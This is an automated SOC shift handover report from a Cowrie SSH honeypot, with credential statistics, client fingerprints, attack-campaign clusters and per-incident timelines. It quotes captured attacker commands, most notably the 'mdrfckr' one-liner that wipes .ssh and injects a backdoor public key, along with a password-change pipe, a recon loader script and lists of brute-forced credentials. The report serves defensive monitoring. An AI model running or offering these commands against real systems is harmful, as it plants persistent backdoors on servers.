# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-19 |
| **Generated At** | 2026-07-19T19:12:35Z |
| **Shift Time** | 19:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **149** |
| Confirmed Threats | **128** |
| False Positives Filtered | **21** (14.1%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **23** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **85** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **84** |
| Unique Credential Pairs | **45** |
| Unique Usernames | **20** |
| Unique Passwords | **44** |
| Successful Auth Pairs | **75** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `admin` | 15 |
| `config` | 8 |
| `gns3` | 6 |
| `unknown` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234567` | 6 |
| `gns3` | 6 |
| `159753` | 6 |
| `666` | 5 |
| `Passw@rd` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `gns3` | `gns3` | 6 |
| `config` | `159753` | 6 |
| `unknown` | `666` | 5 |
| `nobody` | `Passw@rd` | 4 |
| `root` | `root2024` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `letmein` | `92.118.39.14` | 2026-07-19T16:56:15 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-07-19T16:58:30 |
| `root` | `password` | `92.118.39.14` | 2026-07-19T17:00:36 |
| `root` | `qwerty` | `92.118.39.14` | 2026-07-19T17:02:36 |
| `sam` | `sam` | `10.0.0.73` | 2026-07-19T17:03:12 |
| `root` | `system` | `92.118.39.14` | 2026-07-19T17:07:12 |
| `root` | `toor` | `92.118.39.14` | 2026-07-19T17:11:17 |
| `centos` | `Password` | `10.0.0.73` | 2026-07-19T17:11:36 |
| `root` | `toto` | `10.0.0.73` | 2026-07-19T17:12:55 |
| `root` | `toto` | `185.242.3.195` | 2026-07-19T17:14:21 |
| `nobody` | `Passw@rd` | `47.206.63.169` | 2026-07-19T17:14:59 |
| `nobody` | `Passw@rd` | `116.114.84.246` | 2026-07-19T17:15:15 |
| `nobody` | `Passw@rd` | `177.159.150.111` | 2026-07-19T17:18:14 |
| `nobody` | `Passw@rd` | `60.175.91.53` | 2026-07-19T17:18:22 |
| `admin` | `111111` | `92.118.39.14` | 2026-07-19T17:20:56 |
| `doris` | `doris@123` | `185.242.3.195` | 2026-07-19T17:21:48 |
| `admin` | `123123` | `92.118.39.14` | 2026-07-19T17:24:10 |
| `admin` | `raspberry` | `121.202.206.119` | 2026-07-19T17:24:16 |
| `admin` | `raspberry` | `65.20.133.56` | 2026-07-19T17:24:28 |
| `123` | `123` | `70.89.116.5` | 2026-07-19T17:26:21 |
| `123` | `123` | `84.5.129.68` | 2026-07-19T17:26:28 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-19T17:28:22 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-19T17:28:23 |
| `admin` | `1234` | `92.118.39.14` | 2026-07-19T17:29:21 |
| `blank` | `1234567` | `114.98.63.18` | 2026-07-19T17:35:57 |
| `blank` | `1234567` | `10.0.0.73` | 2026-07-19T17:36:19 |
| `root` | `root2024` | `121.159.71.249` | 2026-07-19T17:38:28 |
| `admin` | `12345` | `92.118.39.14` | 2026-07-19T17:38:31 |
| `root` | `root2024` | `117.177.235.249` | 2026-07-19T17:38:38 |
| `support` | `support` | `176.53.159.196` | 2026-07-19T17:39:00 |
| `support` | `support` | `10.0.0.73` | 2026-07-19T17:40:18 |
| `root` | `root2024` | `34.146.248.7` | 2026-07-19T17:41:44 |
| `root` | `root2024` | `121.22.99.2` | 2026-07-19T17:41:53 |
| `condor` | `condor` | `180.76.137.24` | 2026-07-19T17:44:11 |
| `root` | `12341234` | `61.12.84.172` | 2026-07-19T17:49:06 |
| `Ubnt` | `4444444444` | `76.132.238.43` | 2026-07-19T17:51:02 |
| `alicia` | `alicia` | `180.76.137.24` | 2026-07-19T17:52:11 |
| `root` | `12341234` | `10.0.0.73` | 2026-07-19T17:52:55 |
| `admin` | `Symbol` | `112.53.235.78` | 2026-07-19T17:55:56 |
| `centos` | `P@ssword` | `10.0.0.73` | 2026-07-19T18:01:07 |
| `1` | `1` | `165.154.193.52` | 2026-07-19T18:04:07 |
| `root` | `a12345678b` | `111.230.201.117` | 2026-07-19T18:04:45 |
| `345gs5662d34` | `345gs5662d34` | `111.230.201.117` | 2026-07-19T18:04:50 |
| `root` | `3245gs5662d34` | `111.230.201.117` | 2026-07-19T18:04:52 |
| `root` | `root12345678` | `10.0.0.73` | 2026-07-19T18:05:29 |
| `doris` | `doris@123` | `10.0.0.73` | 2026-07-19T18:05:53 |
| `root` | `ADMIN123admin` | `180.76.137.24` | 2026-07-19T18:11:08 |
| `user` | `5555555555` | `65.20.163.103` | 2026-07-19T18:14:05 |
| `ubuntu` | `pa$$w0rd` | `185.242.3.195` | 2026-07-19T18:14:41 |
| `gns3` | `gns3` | `186.23.209.47` | 2026-07-19T18:15:40 |
| `gns3` | `gns3` | `14.54.22.11` | 2026-07-19T18:15:49 |
| `gns3` | `gns3` | `202.111.183.30` | 2026-07-19T18:19:10 |
| `gns3` | `gns3` | `67.85.146.216` | 2026-07-19T18:19:22 |
| `gns3` | `gns3` | `10.0.0.73` | 2026-07-19T18:19:31 |
| `config` | `159753` | `211.253.10.61` | 2026-07-19T18:25:40 |
| `centos` | `admin123` | `10.0.0.73` | 2026-07-19T18:25:43 |
| `config` | `159753` | `84.5.129.68` | 2026-07-19T18:25:47 |
| `config` | `159753` | `111.70.32.46` | 2026-07-19T18:28:58 |
| `config` | `159753` | `45.118.49.18` | 2026-07-19T18:29:07 |
| `config` | `159753` | `10.0.0.73` | 2026-07-19T18:29:18 |
| `admin` | `admin11` | `113.140.95.2` | 2026-07-19T18:38:49 |
| `admin` | `admin11` | `218.149.235.152` | 2026-07-19T18:38:59 |
| `unknown` | `666` | `220.180.166.214` | 2026-07-19T18:40:19 |
| `unknown` | `666` | `23.30.11.253` | 2026-07-19T18:40:31 |
| `admin` | `admin11` | `115.241.228.34` | 2026-07-19T18:42:21 |
| `admin` | `admin11` | `10.0.0.73` | 2026-07-19T18:42:47 |
| `unknown` | `666` | `182.225.134.13` | 2026-07-19T18:43:51 |
| `unknown` | `666` | `49.124.153.30` | 2026-07-19T18:44:01 |
| `unknown` | `666` | `10.0.0.73` | 2026-07-19T18:44:12 |
| `debian` | `1234567` | `119.92.76.210` | 2026-07-19T18:46:33 |
| `debian` | `1234567` | `220.178.246.43` | 2026-07-19T18:46:47 |
| `config` | `config2015` | `62.201.212.54` | 2026-07-19T18:48:53 |
| `debian` | `1234567` | `203.129.217.70` | 2026-07-19T18:50:03 |
| `debian` | `1234567` | `116.7.248.50` | 2026-07-19T18:50:17 |
| `config` | `config2015` | `182.75.227.178` | 2026-07-19T18:52:28 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **149** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 41 |
| libssh | 21 |
| Go SSH scanner | 19 |
| Paramiko (Python) | 2 |
| JSch (Java) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 38 | 37 |
| `03a80b21afa8...` | Modern SSH client | 14 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 11 | 1 |
| `16443846184e...` | Generic scanner | 4 | 1 |
| `f8e6c99abb65...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 38 | 37 | Mirai/variant |
| `03a80b21afa8...` | libssh | 14 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 11 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `f8e6c99abb65...` | OpenSSH | 3 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 10 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1105, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "alicia\nPTaY3Ll76eII\nPTaY3Ll76eII"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `180.76.137.24`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `111.230.201.117`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **47** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS17858` | LG POWERCOMM | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5146a7178af2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 16:56 |
| **Last Seen** | 2026-07-19 16:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 16:56:12` | `cowrie.session.connect` |
| `2026-07-19 16:56:13` | `cowrie.client.version` |
| `2026-07-19 16:56:13` | `cowrie.client.kex` |
| `2026-07-19 16:56:15` | `cowrie.login.success` |
| `2026-07-19 16:56:16` | `cowrie.session.params` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.success` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:16` | `cowrie.command.input` |
| `2026-07-19 16:56:17` | `cowrie.log.closed` |
| `2026-07-19 16:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f4232128f0a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 16:58 |
| **Last Seen** | 2026-07-19 16:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 16:58:27` | `cowrie.session.connect` |
| `2026-07-19 16:58:27` | `cowrie.client.version` |
| `2026-07-19 16:58:27` | `cowrie.client.kex` |
| `2026-07-19 16:58:30` | `cowrie.login.success` |
| `2026-07-19 16:58:32` | `cowrie.session.params` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.success` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:32` | `cowrie.command.input` |
| `2026-07-19 16:58:33` | `cowrie.log.closed` |
| `2026-07-19 16:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64ac4b9b73cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:00 |
| **Last Seen** | 2026-07-19 17:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:00:35` | `cowrie.session.connect` |
| `2026-07-19 17:00:35` | `cowrie.client.version` |
| `2026-07-19 17:00:35` | `cowrie.client.kex` |
| `2026-07-19 17:00:36` | `cowrie.login.success` |
| `2026-07-19 17:00:38` | `cowrie.session.params` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.success` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.command.input` |
| `2026-07-19 17:00:38` | `cowrie.log.closed` |
| `2026-07-19 17:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052194bf5908

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:02 |
| **Last Seen** | 2026-07-19 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:02:35` | `cowrie.session.connect` |
| `2026-07-19 17:02:35` | `cowrie.client.version` |
| `2026-07-19 17:02:35` | `cowrie.client.kex` |
| `2026-07-19 17:02:36` | `cowrie.login.success` |
| `2026-07-19 17:02:38` | `cowrie.session.params` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.success` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.command.input` |
| `2026-07-19 17:02:38` | `cowrie.log.closed` |
| `2026-07-19 17:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3948d7fc49df

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:07 |
| **Last Seen** | 2026-07-19 17:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:07:10` | `cowrie.session.connect` |
| `2026-07-19 17:07:10` | `cowrie.client.version` |
| `2026-07-19 17:07:10` | `cowrie.client.kex` |
| `2026-07-19 17:07:12` | `cowrie.login.success` |
| `2026-07-19 17:07:13` | `cowrie.session.params` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.success` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:13` | `cowrie.command.input` |
| `2026-07-19 17:07:14` | `cowrie.log.closed` |
| `2026-07-19 17:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8515b4f7695

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-19 17:11 |
| **Last Seen** | 2026-07-19 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:11:17` | `cowrie.session.connect` |
| `2026-07-19 17:11:17` | `cowrie.client.version` |
| `2026-07-19 17:11:17` | `cowrie.client.kex` |
| `2026-07-19 17:11:17` | `cowrie.login.success` |
| `2026-07-19 17:11:18` | `cowrie.session.params` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.success` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.command.input` |
| `2026-07-19 17:11:18` | `cowrie.log.closed` |
| `2026-07-19 17:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e4dc5363624

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 17:14 |
| **Last Seen** | 2026-07-19 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 17:14:20` | `cowrie.session.connect` |
| `2026-07-19 17:14:20` | `cowrie.client.version` |
| `2026-07-19 17:14:20` | `cowrie.client.kex` |
| `2026-07-19 17:14:21` | `cowrie.login.success` |
| `2026-07-19 17:14:22` | `cowrie.session.params` |
| `2026-07-19 17:14:22` | `cowrie.command.input` |
| `2026-07-19 17:14:22` | `cowrie.log.closed` |
| `2026-07-19 17:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d20d4296c4f

| Field | Detail |
|---|---|
| **Source IP** | `47.206.63[.]169` |
| **First Seen** | 2026-07-19 17:14 |
